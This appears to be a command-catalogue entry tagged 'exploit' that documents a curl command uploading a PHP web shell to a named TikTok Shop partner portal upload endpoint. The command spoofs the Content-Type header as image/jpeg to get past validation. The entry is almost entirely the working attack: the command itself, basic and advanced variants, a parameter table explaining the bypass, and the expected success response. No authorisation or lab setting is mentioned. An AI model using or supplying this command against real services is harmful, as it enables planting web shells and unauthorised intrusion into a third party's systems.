---
id: cmd-curl-upload-001
data: >-
  curl -X POST 'https://partner.tiktokshop.com/wsos_v2/oec_partner/upload' -H
  'Content-Type: image/jpeg' -H 'Authorization: Bearer YOUR_TOKEN' --data-binary
  '@shell.php' -o response.json
tags:
  - web
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.752Z'
verified: false
validated: true
submitted: true
---
# curl-file-upload-tiktok

## Command

```bash
curl -X POST 'https://partner.tiktokshop.com/wsos_v2/oec_partner/upload' -H 'Content-Type: image/jpeg' -H 'Authorization: Bearer YOUR_TOKEN' --data-binary '@shell.php' -o response.json
```

## Description

This command exploits the unrestricted file upload vulnerability in the TikTok partner portal by sending a POST request with a spoofed Content-Type header to upload a malicious file (e.g., PHP shell). Use it when testing file upload endpoints that fail to validate beyond the header.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H 'Content-Type: image/jpeg'` | Spoofs the MIME type to bypass validation | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Provides authentication token for the endpoint | Yes (if auth required) |
| `--data-binary '@shell.php'` | Uploads the binary file content | Yes |
| `-o response.json` | Saves the server response to a file | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://partner.tiktokshop.com/wsos_v2/oec_partner/upload' -H 'Content-Type: image/jpeg' --data-binary '@shell.php'
```

### Advanced Usage

```bash
curl -X POST 'https://partner.tiktokshop.com/wsos_v2/oec_partner/upload' -H 'Content-Type: image/jpeg' -H 'Authorization: Bearer abc123' --data-binary '@shell.php' -v -o response.json
```

## Expected Output

Successful execution returns a JSON response like {"success": true, "file_id": "uploaded_file.php"}, indicating the upload was accepted. Errors may include 403 (auth failure) or 400 (validation, but unlikely due to vuln).

## Related

- [[Related Procedure: Unrestricted-File-Upload-via-Content-Type-Manipulation]]
